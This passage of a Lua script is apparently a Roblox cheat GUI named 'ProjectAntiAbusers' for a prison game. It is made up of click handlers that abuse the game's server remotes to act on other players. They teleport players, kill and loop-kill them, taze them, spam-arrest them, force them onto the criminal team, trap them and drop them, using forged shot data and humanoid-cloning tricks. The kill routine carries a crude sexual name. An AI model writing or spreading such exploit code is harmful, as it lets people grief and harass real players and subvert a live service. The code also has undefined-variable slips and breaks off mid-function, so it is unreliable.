					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				until i == 0
			end
		end
		Type("Brought all Criminals")
	end)
end
coroutine.wrap(VPCNIZF_fake_script)()
local function WPNQ_fake_script() -- ProjectAntiAbusers.BringNeutralteam.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.BringNeutralteam)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Neutral:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 2
				repeat
					i = i-1
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				until i == 0
			end
		end
		Type("Brought all Neutrals")
	end)
end
coroutine.wrap(WPNQ_fake_script)()
local function DNLBR_fake_script() -- ProjectAntiAbusers.KillPlayer.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillPlayer)

	script.Parent.MouseButton1Click:connect(function()
		target = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		rape(target)
	end)
end
coroutine.wrap(DNLBR_fake_script)()
local function JQQE_fake_script() -- ProjectAntiAbusers.TazePlayer.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.TazePlayer)

	script.Parent.MouseButton1Click:connect(function()
		target = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		saved2 = workspace.Camera.CFrame
		workspace.Remote.loadchar:InvokeServer("", "Bright blue")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
		wait(0.05)
		workspace.Camera.CFrame = saved2
		A_1 = 
			{
			[1] = 
				{
				["RayObject"] = Ray.new(Vector3.new(829.838562, 101.489998, 2331.25635), Vector3.new(-30.6540909, -5.42795324, 95.0308533)), 
				["Distance"] = 15.355997085571, 
				["Cframe"] = CFrame.new(826.616699, 100.8508, 2340.11279, 0.964640439, -0.00993416365, -0.263382077, 9.31322575e-10, 0.999289393, -0.0376908854, 0.263569355, 0.0363581516, 0.963954985), 
				["Hit"] = target.Character.Torso
			}
		}
		A_2 = game.Players.LocalPlayer.Backpack["Taser"]
		Event = game:GetService("ReplicatedStorage").ShootEvent
		Event:FireServer(A_1, A_2)
	end)
end
coroutine.wrap(JQQE_fake_script)()
local function NXZV_fake_script() -- ProjectAntiAbusers.BringPlayer.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.BringPlayer)

	script.Parent.MouseButton1Click:connect(function()
		v = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		if v and v.Character then
			saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			game.Players.LocalPlayer.Character.Humanoid.Sit = false
			for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
				if Z.Name == "Remington 870" then
					workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
				end
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			game.Players.LocalPlayer.Character.Humanoid.Name = 1
			cl = game.Players.LocalPlayer.Character["1"]:Clone()
			cl.Parent = game.Players.LocalPlayer.Character
			cl.Name = "Humanoid"
			wait()
			game.Players.LocalPlayer.Character["1"]:Destroy()
			game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character.Animate.Disabled = true
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			if v.Name == "Remington 870" then
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
			end
		end
		v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
		wait(0.3)
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
		Type("Attempted to bring "..target.Name)
	end)
end
coroutine.wrap(NXZV_fake_script)()
local function JOJFYN_fake_script() -- ProjectAntiAbusers.ArrestPlayer.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.ArrestPlayer)

	script.Parent.MouseButton1Click:connect(function()
		target = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
		wait(.1)
		workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
		wait(.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
	end)
end
coroutine.wrap(JOJFYN_fake_script)()
local function DQGH_fake_script() -- ProjectAntiAbusers.MakeCrimKill.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.MakeCrimKill)

	script.Parent.MouseButton1Click:connect(function()
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		Apart = Instance.new("Part")
		
		Apart.Name = "PlrsPos"
		Apart.Parent = workspace
		Apart.Anchored = true
		Apart.Archivable = true
		Apart.CFrame = CFrame.new(9e99, 9e99, 9e99)
		
		v = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		
		A_1 =
			{
			[1] = 
				{
				["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(277.738678, 6.89340925, 287.773712)), 
				["Distance"] = 4.7204174995422, 
				["Cframe"] = CFrame.new(832.049377, 101.392006, 2300.97168, 0.843892097, -0.0554918349, 0.533635378, 0, 0.994636595, 0.103430569, -0.536512911, -0.0872842371, 0.839366019), 
				["Hit"] = v.Character.Head
			}, 
			[2] = 
				{
				["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(303.047546, 21.3568707, 260.203888)), 
				["Distance"] = 4.8114862442017, 
				["Cframe"] = CFrame.new(832.390259, 101.550629, 2300.74097, 0.738044441, -0.112958886, 0.665229917, 7.45057971e-09, 0.985887885, 0.16740793, -0.674752235, -0.123554483, 0.727628946), 
				["Hit"] = v.Character.Head
			}, 
			[3] = 
				{
				["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(296.800507, 7.00420141, 268.067932)), 
				["Distance"] = 4.444625377655, 
				["Cframe"] = CFrame.new(832.185486, 101.391617, 2300.70264, 0.775115669, -0.0692948848, 0.628007889, 7.45057971e-09, 0.993967533, 0.109675139, -0.631819367, -0.0850109085, 0.770439863), 
				["Hit"] = v.Character.Head
			}, 
			[4] = 
				{
				["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(284.930573, 11.9850616, 280.483368)), 
				["Distance"] = 4.6211166381836, 
				["Cframe"] = CFrame.new(832.10083, 101.445007, 2300.86963, 0.820150614, -0.0735745132, 0.567397356, 0, 0.991697431, 0.128593579, -0.572147667, -0.105466105, 0.81334126), 
				["Hit"] = v.Character.Head
			}, 
			[5] = 
				{
				["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(294.625824, 2.15741801, 270.538269)), 
				["Distance"] = 4.4639973640442, 
				["Cframe"] = CFrame.new(832.169434, 101.341301, 2300.73438, 0.784266233, -0.0537625961, 0.618090749, -3.7252903e-09, 0.99623847, 0.086654529, -0.620424569, -0.0679602176, 0.781316102), 
				["Hit"] = v.Character.Head
			}
		}
		A_2 = game.Players.LocalPlayer.Backpack["Remington 870"]
		Event = game:GetService("ReplicatedStorage").ShootEvent
		Event:FireServer(A_1, A_2)
		
		workspace.Remote.TeamEvent:FireServer("Bright orange")
		
		LCS = game.Workspace["Criminals Spawn"].SpawnLocation
		
		_G.killaura = true
		wait(0.1)
		
		Apart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		Apart.Transparency = 1
		Apart.Anchored = true
		Apart.CanCollide = false
		wait(0.1)
		for i = 1,20 do
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
			
			istptoplr = true
			wait(0.004)
			
			if istptoplr == true then
				while istptoplr do
					wait()
					
					game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = v.Character.HumanoidRootPart.CFrame
					
					LCS = game.Workspace["Criminals Spawn"].SpawnLocation
					
					LCS.CanCollide = false
					LCS.Size = Vector3.new(51.05, 24.12, 54.76)
					LCS.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					LCS.Transparency = 1
					
					wait(0.1)
					
					istptoplr = false
					wait(0.04)
					
					if istptoplr == false then
						LCS.CFrame = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
						LCS.Size = Vector3.new(6, 0.2, 6)
						LCS.Transparency = 0
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Apart.CFrame
						wait()
						istptoplr = false
						wait(0.1)
						workspace.Remote.TeamEvent:FireServer("Bright orange")
					end
				end
			end
		end
		Type("attempted to make "..target.Name.." a criminal using the kill method")
	end)
end
coroutine.wrap(DQGH_fake_script)()
local function FFXJGAP_fake_script() -- ProjectAntiAbusers.MakeCrimBring.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.MakeCrimBring)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
		wait(0.2)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		v = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		if v and v.Character then
			saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			game.Players.LocalPlayer.Character.Humanoid.Sit = false
			for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
				if Z.Name == "Remington 870" then
					workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
				end
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			game.Players.LocalPlayer.Character.Humanoid.Name = 1
			cl = game.Players.LocalPlayer.Character["1"]:Clone()
			cl.Parent = game.Players.LocalPlayer.Character
			cl.Name = "Humanoid"
			wait()
			game.Players.LocalPlayer.Character["1"]:Destroy()
			game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character.Animate.Disabled = true
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			if v.Name == "Remington 870" then
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
			end
		end
		v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
		wait(0.3)
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
		Type("attempted to make "..target.Name.." a criminal using the bring method")
	end)
end
coroutine.wrap(FFXJGAP_fake_script)()
local function ZOCJP_fake_script() -- ProjectAntiAbusers.TrapPlayer.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.TrapPlayer)

	script.Parent.MouseButton1Click:connect(function()
		v = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-306.426514, 54.2398338, 1982.18201, 0.812489867, -4.78796665e-08, 0.582975328, 7.8811361e-08, 1, -2.77091701e-08, -0.582975328, 6.84584975e-08, 0.812489867)
		wait(0.2)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		if v and v.Character then
			saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			game.Players.LocalPlayer.Character.Humanoid.Sit = false
			for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
				if Z.Name == "Remington 870" then
					workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
				end
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			game.Players.LocalPlayer.Character.Humanoid.Name = 1
			cl = game.Players.LocalPlayer.Character["1"]:Clone()
			cl.Parent = game.Players.LocalPlayer.Character
			cl.Name = "Humanoid"
			wait()
			game.Players.LocalPlayer.Character["1"]:Destroy()
			game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character.Animate.Disabled = true
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			if v.Name == "Remington 870" then
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
			end
		end
		v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
		wait(0.3)
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
	end)
end
coroutine.wrap(ZOCJP_fake_script)()
local function UXGPMC_fake_script() -- ProjectAntiAbusers.DropPlayer.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.DropPlayer)
	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(850.99115, 2324.20532, 2123.28931, -0.927321851, -0.0504675396, 0.370846629, -2.69729261e-09, 0.99086678, 0.134844437, -0.374264896, 0.125044197, -0.918852389)
		wait(0.2)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		v = FindPlayer(script.Parent.Parent.usernamebox.Text)
		if v and v.Character then
			saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			game.Players.LocalPlayer.Character.Humanoid.Sit = false
			for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
				if Z.Name == "Remington 870" then
					workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
				end
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			game.Players.LocalPlayer.Character.Humanoid.Name = 1
			cl = game.Players.LocalPlayer.Character["1"]:Clone()
			cl.Parent = game.Players.LocalPlayer.Character
			cl.Name = "Humanoid"
			wait()
			game.Players.LocalPlayer.Character["1"]:Destroy()
			game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character.Animate.Disabled = true
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			if v.Name == "Remington 870" then
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
			end
		end
		v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
		wait(0.3)
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
		Type("attempted to drop "..target.Name)
	end)	
end
coroutine.wrap(UXGPMC_fake_script)()
local function TSDSKIE_fake_script() -- ProjectAntiAbusers.LoopKillPlayer.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.LoopKillPlayer)

	lk = false
	script.Parent.MouseButton1Click:connect(function()
		if lk == false then
			lk = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			lk = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		target = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		repeat
			rape(target)
		until lk == false
	end)
end
coroutine.wrap(TSDSKIE_fake_script)()
local function AHBN_fake_script() -- ProjectAntiAbusers.SpamArrest.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.SpamArrest)

	_G.spam = false
	script.Parent.MouseButton1Click:connect(function()
		if _G.spam == false then
			_G.spam = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			_G.spam = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		target = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		game:GetService("RunService").Heartbeat:Connect(function()
			if _G.spam == true then
				if target and target.Character then
					while _G.spam == true do wait()
						workspace.Remote.arrest:InvokeServer(target.Character.Torso)
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame 
					end
				end
			end
		end)
	end)
end
coroutine.wrap(AHBN_fake_script)()
local function POIR_fake_script() -- ProjectAntiAbusers.ViewPlayer.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.ViewPlayer)

	view = false
	script.Parent.MouseButton1Click:connect(function()
		target = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		if view == false then
			view = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			view = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		if workspace.Camera.CameraSubject == game.Players.LocalPlayer.Character.Humanoid then
			workspace.Camera.CameraSubject = target.Character.Humanoid
		else
			workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
		end
	end)
end
coroutine.wrap(POIR_fake_script)()
local function IOXIU_fake_script() -- ProjectAntiAbusers.UserInfo.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.UserInfo)

	script.Parent.MouseButton1Click:connect(function()
		target = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		userinfo = Instance.new("ScreenGui")
		UserInfoInvisFrame = Instance.new("Frame")
		Background = Instance.new("Frame")
		TopBar = Instance.new("Frame")
		UICorner = Instance.new("UICorner")
		CloseButton = Instance.new("TextButton")
		UICorner_2 = Instance.new("UICorner")
		Title = Instance.new("TextLabel")
		UICorner_3 = Instance.new("UICorner")
		ImageLabel = Instance.new("ImageLabel")
		UICorner_4 = Instance.new("UICorner")
		UsernameLabel = Instance.new("TextLabel")
		UserIDLabel = Instance.new("TextLabel")
		AccountAgeLabel = Instance.new("TextLabel")
		StatusLabel = Instance.new("TextLabel")
		UsernameInfoLabel = Instance.new("TextLabel")
		UserIDInfoLabel = Instance.new("TextLabel")
		AccountAgeInfoLabel = Instance.new("TextLabel")
		StatusInfoLabel = Instance.new("TextLabel")
		
		userinfo.Name = "userinfo"
		userinfo.Parent = game.CoreGui
		userinfo.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		
		UserInfoInvisFrame.Name = "UserInfoInvisFrame"
		UserInfoInvisFrame.Parent = userinfo
		UserInfoInvisFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		UserInfoInvisFrame.BackgroundTransparency = 1.000
		UserInfoInvisFrame.Position = UDim2.new(0.727611959, 0, 0.41446209, 0)
		UserInfoInvisFrame.Size = UDim2.new(0, 196, 0, 268)
		
		Background.Name = "Background"
		Background.Parent = UserInfoInvisFrame
		Background.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
		Background.Position = UDim2.new(-0.0459183678, 0, 0, 0)
		Background.Size = UDim2.new(0, 205, 0, 268)
		
		TopBar.Name = "TopBar"
		TopBar.Parent = Background
		TopBar.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
		TopBar.Size = UDim2.new(0, 205, 0, 16)
		
		UICorner.Parent = TopBar
		
		CloseButton.Name = "CloseButton"
		CloseButton.Parent = TopBar
		CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		CloseButton.Position = UDim2.new(0.900597334, 0, 0.106151581, 0)
		CloseButton.Size = UDim2.new(0, 20, 0, 11)
		CloseButton.Font = Enum.Font.SourceSans
		CloseButton.Text = ""
		CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
		CloseButton.TextSize = 14.000
		CloseButton.MouseButton1Click:connect(function()
			game.CoreGui.userinfo:Destroy()
		end)
		
		UICorner_2.Parent = CloseButton
		
		Title.Name = "Title"
		Title.Parent = TopBar
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.Position = UDim2.new(0.0926829278, 0, 0, 0)
		Title.Size = UDim2.new(0, 165, 0, 16)
		Title.Font = Enum.Font.SciFi
		Title.Text = "User Info"
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextSize = 19.000
		
		UICorner_3.Parent = Background
		
		ImageLabel.Parent = Background
		ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel.Position = UDim2.new(0.253658533, 0, 0.0708955228, 0)
		ImageLabel.Size = UDim2.new(0, 100, 0, 100)
		ImageLabel.Image = "rbxasset://textures/ui/ProjectAntiAbusersImagePlaceholder.png"
		
		UICorner_4.Parent = ImageLabel
		
		UsernameLabel.Name = "UsernameLabel"
		UsernameLabel.Parent = Background
		UsernameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		UsernameLabel.BackgroundTransparency = 1.000
		UsernameLabel.Position = UDim2.new(0.0341463387, 0, 0.485919654, 0)
		UsernameLabel.Size = UDim2.new(0, 75, 0, 15)
		UsernameLabel.Font = Enum.Font.SciFi
		UsernameLabel.Text = "Username: "
		UsernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		UsernameLabel.TextSize = 19.000
		
		UserIDLabel.Name = "UserIDLabel"
		UserIDLabel.Parent = Background
		UserIDLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		UserIDLabel.BackgroundTransparency = 1.000
		UserIDLabel.Position = UDim2.new(0.0341463424, 0, 0.560546517, 0)
		UserIDLabel.Size = UDim2.new(0, 49, 0, 15)
		UserIDLabel.Font = Enum.Font.SciFi
		UserIDLabel.Text = "UserID: "
		UserIDLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		UserIDLabel.TextSize = 19.000
		
		AccountAgeLabel.Name = "AccountAgeLabel"
		AccountAgeLabel.Parent = Background
		AccountAgeLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		AccountAgeLabel.BackgroundTransparency = 1.000
		AccountAgeLabel.Position = UDim2.new(0.0341463424, 0, 0.63517338, 0)
		AccountAgeLabel.Size = UDim2.new(0, 93, 0, 15)
		AccountAgeLabel.Font = Enum.Font.SciFi
		AccountAgeLabel.Text = "Account Age: "
		AccountAgeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		AccountAgeLabel.TextSize = 19.000
		
		StatusLabel.Name = "StatusLabel"
		StatusLabel.Parent = Background
		StatusLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		StatusLabel.BackgroundTransparency = 1.000
		StatusLabel.Position = UDim2.new(0.0341463387, 0, 0.713531613, 0)
		StatusLabel.Size = UDim2.new(0, 52, 0, 15)
		StatusLabel.Font = Enum.Font.SciFi
		StatusLabel.Text = "Status: "
		StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		StatusLabel.TextSize = 19.000
		
		UsernameInfoLabel.Name = "UsernameInfoLabel"
		UsernameInfoLabel.Parent = Background
		UsernameInfoLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		UsernameInfoLabel.BackgroundTransparency = 1.000
		UsernameInfoLabel.Position = UDim2.new(0.429268301, 0, 0.493999988, 0)
		UsernameInfoLabel.Size = UDim2.new(0, 116, 0, 15)
		UsernameInfoLabel.Font = Enum.Font.SciFi
		UsernameInfoLabel.Text = target.Name
		UsernameInfoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		UsernameInfoLabel.TextScaled = true
		UsernameInfoLabel.TextSize = 19.000
		UsernameInfoLabel.TextWrapped = true
		UsernameInfoLabel.TextXAlignment = Enum.TextXAlignment.Left
		
		UserIDInfoLabel.Name = "UserIDInfoLabel"
		UserIDInfoLabel.Parent = Background
		UserIDInfoLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		UserIDInfoLabel.BackgroundTransparency = 1.000
		UserIDInfoLabel.Position = UDim2.new(0.317073166, 0, 0.560546517, 0)
		UserIDInfoLabel.Size = UDim2.new(0, 133, 0, 15)
		UserIDInfoLabel.Font = Enum.Font.SciFi
		UserIDInfoLabel.Text = target.UserId
		UserIDInfoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		UserIDInfoLabel.TextSize = 19.000
		UserIDInfoLabel.TextWrapped = true
		UserIDInfoLabel.TextXAlignment = Enum.TextXAlignment.Left
		
		AccountAgeInfoLabel.Name = "AccountAgeInfoLabel"
		AccountAgeInfoLabel.Parent = Background
		AccountAgeInfoLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		AccountAgeInfoLabel.BackgroundTransparency = 1.000
		AccountAgeInfoLabel.Position = UDim2.new(0.531000018, 0, 0.63517338, 0)
		AccountAgeInfoLabel.Size = UDim2.new(0, 93, 0, 15)
		AccountAgeInfoLabel.Font = Enum.Font.SciFi
		AccountAgeInfoLabel.Text = target.AccountAge
		AccountAgeInfoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		AccountAgeInfoLabel.TextSize = 19.000
		AccountAgeInfoLabel.TextXAlignment = Enum.TextXAlignment.Left
		
		StatusInfoLabel.Name = "StatusInfoLabel"
		StatusInfoLabel.Parent = Background
		StatusInfoLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		StatusInfoLabel.BackgroundTransparency = 1.000
		StatusInfoLabel.Position = UDim2.new(0.331707329, 0, 0.713531613, 0)
		StatusInfoLabel.Size = UDim2.new(0, 52, 0, 15)
		StatusInfoLabel.Font = Enum.Font.SciFi
		StatusInfoLabel.Text = "Offline"
		StatusInfoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		StatusInfoLabel.TextSize = 19.000
	end)
end
coroutine.wrap(IOXIU_fake_script)()
local function KKJWG_fake_script() -- ProjectAntiAbusers.Who.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.Who)

	script.Parent.MouseButton1Click:connect(function()
		target = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		game:GetService("StarterProjectAntiAbusers"):SetCore("ChatMakeSystemMessage", {
			Text = "the person you got is: "..target.Name,
			Color = Color3.new(0,0,0),
			FontSize = Enum.FontSize.Size24
		})
	end)
end
coroutine.wrap(KKJWG_fake_script)()
local function QDVM_fake_script() -- ProjectAntiAbusers.TpToPlayer.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.TpToPlayer)

	script.Parent.MouseButton1Click:connect(function()
		v = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
	end)
end
coroutine.wrap(QDVM_fake_script)()
local function EGSD_fake_script() -- ProjectAntiAbusers.SuicideKnife.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.SuicideKnife)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character:BreakJoints()
	end)
end
coroutine.wrap(EGSD_fake_script)()
local function GGFRB_fake_script() -- ProjectAntiAbusers.SuicideGun.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.SuicideGun)

	script.Parent.MouseButton1Click:connect(function()
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		game.Players.LocalPlayer.Backpack:FindFirstChild("M9").GripForward = Vector3.new(0.57735, 0.57735, 0.57735)
		game.Players.LocalPlayer.Backpack:FindFirstChild("M9").Parent = workspace[(game.Players.LocalPlayer.Name)]
		wait(1)
		game.Players.LocalPlayer.Character:BreakJoints()
	end)
end
